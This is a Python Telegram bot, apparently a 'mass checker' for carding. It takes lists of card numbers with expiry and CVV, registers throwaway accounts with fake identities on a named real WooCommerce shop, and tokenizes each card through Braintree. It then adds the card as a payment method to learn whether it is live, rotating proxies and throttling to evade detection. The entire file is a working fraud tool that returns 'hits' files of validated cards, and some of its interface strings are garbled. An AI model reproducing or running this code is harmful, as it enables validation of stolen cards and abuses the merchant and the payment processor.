import requests
import re
import base64
import random
import string
import time
import threading
import io
import pycountry
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackQueryHandler
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, ParseMode
from bs4 import BeautifulSoup
import concurrent.futures

# User data to manage multiple users' checking processes
user_data = {}

# Load proxies from proxies.txt
def load_proxies():
    try:
        with open('proxies.txt', 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        return []

proxies = load_proxies()

# Utility functions for generating random data
def generate_full_name():
    first = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah"]
    last = ["Khalil", "Abdullah", "Smith", "Johnson", "Williams"]
    return random.choice(first), random.choice(last)

def generate_address():
    cities = ["London", "Manchester"]
    streets = ["Baker St", "Oxford St"]
    zips = ["SW1A 1AA", "M1 1AE"]
    city = random.choice(cities)
    return city, "England", f"{random.randint(1, 999)} {random.choice(streets)}", random.choice(zips)

def generate_email():
    return ''.join(random.choices(string.ascii_lowercase, k=10)) + "@gmail.com"

def generate_username():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=15))

def generate_phone():
    return "303" + ''.join(random.choices(string.digits, k=7))

def generate_code(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def get_flag(country_code):
    try:
        country = pycountry.countries.get(alpha_2=country_code)
        if country:
            flag = ''.join(chr(ord(c) + 127397) for c in country.alpha_2.upper())
            return f"{country.name} {flag}"
        return country_code
    except:
        return country_code

# Function to check a credit card using Braintree API
def check_cc(cc, mes, ano, cvv, proxy=None):
    start_time = time.time()
    full = f"{cc}|{mes}|{ano}|{cvv}"
    
    first_name, last_name = generate_full_name()
    city, state, street_address, zip_code = generate_address()
    acc = generate_email()
    username = generate_username()
    num = generate_phone()

    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'}
    session = requests.Session()
    if proxy:
        session.proxies = {'http': proxy, 'https': proxy}

    try:
        # Register a new account
        r = session.get('https://www.bebebrands.com/my-account/', headers=headers)
        reg = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', r.text).group(1)
        session.post('https://www.bebebrands.com/my-account/', headers=headers, data={
            'username': username, 'email': acc, 'password': 'SandeshThePapa@',
            'woocommerce-register-nonce': reg, '_wp_http_referer': '/my-account/', 'register': 'Register'
        })

        # Add billing address
        r = session.get('https://www.bebebrands.com/my-account/edit-address/billing/', headers=headers)
        address_nonce = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', r.text).group(1)
        session.post('https://www.bebebrands.com/my-account/edit-address/billing/', headers=headers, data={
            'billing_first_name': first_name, 'billing_last_name': last_name, 'billing_country': 'GB',
            'billing_address_1': street_address, 'billing_city': city, 'billing_postcode': zip_code,
            'billing_phone': num, 'billing_email': acc, 'save_address': 'Save address',
            'woocommerce-edit-address-nonce': address_nonce,
            '_wp_http_referer': '/my-account/edit-address/billing/', 'action': 'edit_address'
        })

        # Get payment method page and tokenize card
        r = session.get('https://www.bebebrands.com/my-account/add-payment-method/', headers=headers)
        add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', r.text).group(1)
        client_nonce = re.search(r'client_token_nonce":"([^"]+)"', r.text).group(1)

        token_resp = session.post('https://www.bebebrands.com/wp-admin/admin-ajax.php', headers=headers, data={
            'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_nonce
        })
        enc = token_resp.json()['data']
        dec = base64.b64decode(enc).decode('utf-8')
        au = re.search(r'"authorizationFingerprint":"(.*?)"', dec).group(1)

        tokenize_headers = {
            'authorization': f'Bearer {au}', 'braintree-version': '2018-05-10', 'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com', 'referer': 'https://assets.braintreegateway.com/',
            'user-agent': headers['user-agent']
        }

        json_data = {
            'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': generate_code(36)},
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
            'variables': {'input': {'creditCard': {'number': cc, 'expirationMonth': mes, 'expirationYear': ano, 'cvv': cvv}, 'options': {'validate': False}}},
            'operationName': 'TokenizeCreditCard'
        }

        r = requests.post('https://payments.braintree-api.com/graphql', headers=tokenize_headers, json=json_data, proxies=session.proxies if proxy else None)
        if 'errors' in r.json():
            return {'status': 'declined', 'message': 'Invalid card details', 'time_taken': time.time() - start_time}

        tok = r.json()['data']['tokenizeCreditCard']['token']
        credit_card = r.json()['data']['tokenizeCreditCard']['creditCard']
        bin_data = credit_card['binData']
        card_info = {
            'brand': credit_card['brandCode'].capitalize(),
            'type': 'debit' if bin_data['debit'] == 'Yes' else 'credit',
            'bin': credit_card['bin'],
            'last4': credit_card['last4']
        }
        issuer = bin_data['issuingBank']
        country = bin_data['countryOfIssuance']

        # Submit payment method
        data = [
            ('payment_method', 'braintree_credit_card'), ('wc-braintree-credit-card-card-type', 'master-card'),
            ('wc-braintree-credit-card-3d-secure-enabled', ''), ('wc-braintree-credit-card-3d-secure-verified', ''),
            ('wc-braintree-credit-card-3d-secure-order-total', '0.00'), ('wc_braintree_credit_card_payment_nonce', tok),
            ('wc_braintree_device_data', '{"correlation_id":"ca769b8abef6d39b5073a87024953791"}'),
            ('wc-braintree-credit-card-tokenize-payment-method', 'true'), ('wc_braintree_paypal_payment_nonce', ''),
            ('wc_braintree_device_data', '{"correlation_id":"ca769b8abef6d39b5073a87024953791"}'),
            ('wc-braintree-paypal-context', 'shortcode'), ('wc_braintree_paypal_amount', '0.00'),
            ('wc_braintree_paypal_currency', 'GBP'), ('wc_braintree_paypal_locale', 'en_gb'),
            ('wc-braintree-paypal-tokenize-payment-method', 'true'), ('woocommerce-add-payment-method-nonce', add_nonce),
            ('_wp_http_referer', '/my-account/add-payment-method/'), ('woocommerce_add_payment_method', '1')
        ]

        response = session.post('https://www.bebebrands.com/my-account/add-payment-method/', headers=headers, data=data)
        soup = BeautifulSoup(response.text, 'html.parser')
        error_message = soup.select_one('.woocommerce-error .message-container')

        if error_message:
            msg = error_message.text.strip()
        else:
            msg = 'Unknown error'

        if any(x in response.text for x in ['Nice! New payment method added', 'Insufficient funds', 'Payment method successfully added.', 'Nice', 'Duplicate card exists in the vault.']):
            return {
                'status': 'approved', 'message': 'APPROVED ✅', 'card_info': card_info,
                'issuer': issuer, 'country': country, 'time_taken': time.time() - start_time
            }
        elif 'Card Issuer Declined CVV' in response.text:
            return {
                'status': 'ccn', 'message': '2010: Card Issuer Declined CVV ✅', 'card_info': card_info,
                'issuer': issuer, 'country': country, 'time_taken': time.time() - start_time
            }
        else:
            return {
                'status': 'declined', 'message': msg, 'card_info': card_info,
                'issuer': issuer, 'country': country, 'time_taken': time.time() - start_time
            }
    except Exception as e:
        return {'status': 'declined', 'message': str(e), 'time_taken': time.time() - start_time}

# Format response messages
def format_approved_message(result, card, user_id, bot):
    user = bot.get_chat(user_id)
    checked_by = f'<a href="tg://user?id={user_id}">{user.first_name}</a>'
    card_info = f"{result['card_info']['brand']} - {result['card_info']['type']}"
    country = get_flag(result['country'])
    header = "<b>𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅</b>" if result['status'] == 'approved' else "<b>𝐂𝐂𝐍 ✅</b>"
    return f"""
{header}

𝗖𝗮𝗿𝗱: {card}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆: Braintree Auth
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {result['message']}

𝗜𝗻𝗳𝗼: {card_info}
𝗜𝘀𝘀𝘂𝗲𝗿: {result['issuer']} 🏛
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}

𝗧𝗶𝗺𝗲: {result['time_taken']:.2f} seconds
𝗖𝗵𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: {checked_by}
"""

def format_declined_message(result, card, user_id, bot):
    user = bot.get_chat(user_id)
    checked_by = f'<a href="tg://user?id={user_id}">{user.first_name}</a>'
    card_info = f"{result['card_info']['brand']} - {result['card_info']['type']}" if 'card_info' in result else "Unknown"
    country = get_flag(result['country']) if 'country' in result else "Unknown"
    issuer = result['issuer'] if 'issuer' in result else "Unknown"
    return f"""
<b>𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌</b>

𝗖𝗮𝗿𝗱: {card}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆: Braintree Auth
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {result['message']}

𝗜𝗻𝗳𝗼: {card_info}
𝗜𝘀𝘀𝘂𝗲𝗿: {issuer} 🏛
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}

𝗧𝗶𝗺𝗲: {result['time_taken']:.2f} seconds
𝗖𝗵𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: {checked_by}
"""

def generate_progress_message(approved, ccn, declined, checked, total, start_time):
    duration = time.time() - start_time
    avg_speed = checked / duration if duration > 0 else 0
    success_rate = (approved / checked * 100) if checked > 0 else 0
    return f"""
[⌬] 𝐅𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐋𝐈𝐕𝐄 𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒 😈⚡
━━━━━━━━━━━━━━━━━━━━━━
[✪] 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: {approved}
[✪] 𝐂𝐂𝐍: {ccn}
[❌] 𝐃𝐞𝐜𝐥𝗶𝗻𝗲𝗱: {declined}
[✪] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝: {checked}/{total}
[✪] 𝐓𝐨𝐭𝐚𝐥: {total}
[✪] 𝐃𝐮𝐫𝐚𝘁𝗶𝗼𝗻: {duration:.2f} seconds
[✪] 𝐀𝐯𝐠 𝐒𝐩𝐞𝐞𝐝: {avg_speed:.2f} cards/sec
[✪] 𝐒𝐮𝗰𝗰𝗲𝘀𝘀 𝐑𝐚𝘁𝗲: {success_rate:.2f}%
━━━━━━━━━━━━━━━━━━━━━━
[み] 𝐃𝐞𝐯: 𓆰𝅃꯭᳚⚡!! ⏤‌𝐅ɴ x 𝐄ʟᴇᴄᴛʀᴀ𓆪𓆪⏤‌➤⃟🔥✘ <a href="tg://user?id=7593550190">FNxELECTRA</a>
━━━━━━━━━━━━━━━━━━━━━━
"""

# Telegram command handlers
def start(update, context):
    keyboard = [
        [InlineKeyboardButton("Upload Combo", callback_data='upload_combo')],
        [InlineKeyboardButton("Live Stats", callback_data='live_stats')],
        [InlineKeyboardButton("Help", callback_data='help')],
        [InlineKeyboardButton("Cancel Check", callback_data='cancel_check')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    update.message.reply_text(
        "🔥 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐅𝐍 𝐌𝐀𝐒𝐒 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐁𝐎𝐓!\n\n"
        "🔥 𝐔𝐬𝐞 /chk 𝐓𝐨 𝐂𝐡𝐞𝐜𝐤 𝐒𝐢𝐧𝐠𝐥𝐞 𝐂𝐂\n"
        "📁 𝐒𝐞𝐧𝐝 𝐂𝐨𝐦𝐛𝐨 𝐅𝐢𝐥𝐞 𝐎𝐫 𝐄𝐥𝐬𝐞 𝐔𝐬𝐞 𝐁𝐮𝐭𝐭𝐨𝐧 𝐁𝐞𝐥𝐨𝐰:",
        reply_markup=reply_markup
    )

def chk(update, context):
    user_id = update.message.from_user.id
    text = update.message.text.split(' ', 1)
    if len(text) < 2:
        update.message.reply_text("Please use: /chk cc|mm|yy|cvv")
        return
    card = text[1].strip()
    try:
        cc, mes, ano, cvv = card.split('|')
        if len(mes) == 1:
            mes = f'0{mes}'
        if not ano.startswith('20'):
            ano = f'20{ano}'
        proxy = random.choice(proxies) if proxies else None
        result = check_cc(cc, mes, ano, cvv, proxy)
        if result['status'] in ['approved', 'ccn']:
            message = format_approved_message(result, card, user_id, context.bot)
        else:
            message = format_declined_message(result, card, user_id, context.bot)
        update.message.reply_text(message, parse_mode='HTML')
    except:
        update.message.reply_text("Invalid format. Use: /chk cc|mm|yy|cvv")

def handle_file(update, context):
    user_id = update.message.from_user.id
    if user_id in user_data and user_data[user_id].get('checking', False):
        update.message.reply_text("You have an ongoing check. Use 'Cancel Check' to stop it first.")
        return
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        update.message.reply_text("Please send a .txt file with cards in format: cc|mm|yy|cvv")
        return
    file = context.bot.get_file(document.file_id)
    content = requests.get(file.file_path).text
    cards = [line.strip() for line in content.splitlines() if line.strip()]
    if not cards:
        update.message.reply_text("File is empty or invalid.")
        return
    user_data[user_id] = {'checking': False, 'stop': False}
    msg = context.bot.send_message(user_id, "✅ 𝐅𝐢𝐥𝐞 𝐑𝐞� c𝐞𝐢𝐯𝐞𝐝! 𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠...\n"
                                          "⚡ 𝐒𝐩𝐞𝐞𝐝: 𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬 𝐖𝐢𝐥𝐥 𝐁𝐞 𝐔𝐩𝐝𝐚𝐭𝐞𝐝 𝐖𝐡𝐞𝐧 𝐁𝐨𝐭 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 50 𝐂𝐚𝐫𝐝𝐬/sec\n"
                                          "📈 𝐔𝐬𝐞 /progress 𝐅𝐨𝐫 𝐋𝐢𝐯𝐞 𝐔𝐩𝐝𝐚𝐭𝐞𝐳")
    user_data[user_id]['progress_message_id'] = msg.message_id
    threading.Thread(target=check_multiple_cards, args=(context.bot, user_id, cards)).start()

def check_multiple_cards(bot, user_id, cards):
    user_data[user_id].update({
        'checking': True, 'cards': cards, 'checked': 0, 'approved': 0, 'ccn': 0,
        'approved_list': [], 'start_time': time.time(), 'last_updated': 0
    })
    chunk_size = 3
    for i in range(0, len(cards), chunk_size):
        if user_data[user_id]['stop']:
            break
        chunk = cards[i:i+chunk_size]
        with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
            future_to_card = {}
            for card in chunk:
                try:
                    cc, mes, ano, cvv = card.split('|')
                    if len(mes) == 1:
                        mes = f'0{mes}'
                    if not ano.startswith('20'):
                        ano = f'20{ano}'
                    proxy = random.choice(proxies) if proxies else None
                    future = executor.submit(check_cc, cc, mes, ano, cvv, proxy)
                    future_to_card[future] = card
                except:
                    continue
            for future in concurrent.futures.as_completed(future_to_card):
                card = future_to_card[future]
                try:
                    result = future.result()
                    user_data[user_id]['checked'] += 1
                    if result['status'] == 'approved':
                        user_data[user_id]['approved'] += 1
                        user_data[user_id]['approved_list'].append((card, 'approved'))
                        bot.send_message(user_id, format_approved_message(result, card, user_id, bot), parse_mode='HTML')
                    elif result['status'] == 'ccn':
                        user_data[user_id]['ccn'] += 1
                        user_data[user_id]['approved_list'].append((card, 'ccn'))
                        bot.send_message(user_id, format_approved_message(result, card, user_id, bot), parse_mode='HTML')
                    if user_data[user_id]['checked'] - user_data[user_id]['last_updated'] >= 50:
                        declined = user_data[user_id]['checked'] - user_data[user_id]['approved'] - user_data[user_id]['ccn']
                        progress = generate_progress_message(
                            user_data[user_id]['approved'], user_data[user_id]['ccn'], declined,
                            user_data[user_id]['checked'], len(cards), user_data[user_id]['start_time']
                        )
                        bot.edit_message_text(progress, chat_id=user_id, message_id=user_data[user_id]['progress_message_id'], parse_mode='HTML')
                        user_data[user_id]['last_updated'] = user_data[user_id]['checked']
                except:
                    continue
        time.sleep(60)  # Wait 60 seconds after each batch
    declined = user_data[user_id]['checked'] - user_data[user_id]['approved'] - user_data[user_id]['ccn']
    summary = generate_progress_message(
        user_data[user_id]['approved'], user_data[user_id]['ccn'], declined,
        user_data[user_id]['checked'], len(cards), user_data[user_id]['start_time']
    ).replace("𝐋𝐈𝐕𝐄 𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒", "𝐇𝐈𝐓𝐒")
    approved_file = io.StringIO()
    for card, status in user_data[user_id]['approved_list']:
        if status == 'approved':
            approved_file.write(f"APPROVED ✅ {card}\n")
        elif status == 'ccn':
            approved_file.write(f"CCN ✅ {card}\n")
    approved_file.seek(0)
    bot.send_document(user_id, approved_file, filename=f"fn-checker-hits{random.randint(1000,9999)}.txt",
                      caption=summary, parse_mode='HTML')
    user_data[user_id]['checking'] = False

def button(update, context):
    query = update.callback_query
    user_id = query.from_user.id
    query.answer()
    if query.data == 'upload_combo':
        query.message.reply_text("Please send your combo file (.txt) with cards in format: cc|mm|yy|cvv")
    elif query.data == 'live_stats':
        if user_id in user_data and user_data[user_id].get('checking', False):
            declined = user_data[user_id]['checked'] - user_data[user_id]['approved'] - user_data[user_id]['ccn']
            progress = generate_progress_message(
                user_data[user_id]['approved'], user_data[user_id]['ccn'], declined,
                user_data[user_id]['checked'], len(user_data[user_id]['cards']), user_data[user_id]['start_time']
            )
            query.message.reply_text(progress, parse_mode='HTML')
        else:
            query.message.reply_text("No ongoing check.")
    elif query.data == 'help':
        query.message.reply_text(
            "🔥 𝐅𝐍 𝐌𝐀𝐒𝐒 𝐂𝐇𝐄�{C𝐊𝐄𝐑 𝐁𝐎𝐓\n\n"
            "• Use /chk cc|mm|yy|cvv to check a single card.\n"
            "• Send a .txt file with cards (cc|mm|yy|cvv, one per line) to check multiple cards.\n"
            "• Use 'Live Stats' to see current progress.\n"
            "• Use 'Cancel Check' to stop an ongoing check."
        )
    elif query.data == 'cancel_check':
        if user_id in user_data and user_data[user_id].get('checking', False):
            user_data[user_id]['stop'] = True
            query.message.reply_text("Check canceled.")
        else:
            query.message.reply_text("No ongoing check to cancel.")

# Main function to start the bot
def main():
    updater = Updater('YOUR_BOT_TOKEN', use_context=True)  # Replace with your Telegram Bot Token
    dp = updater.dispatcher
    dp.add_handler(CommandHandler('start', start))
    dp.add_handler(CommandHandler('chk', chk))
    dp.add_handler(MessageHandler(Filters.document, handle_file))
    dp.add_handler(CallbackQueryHandler(button))
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()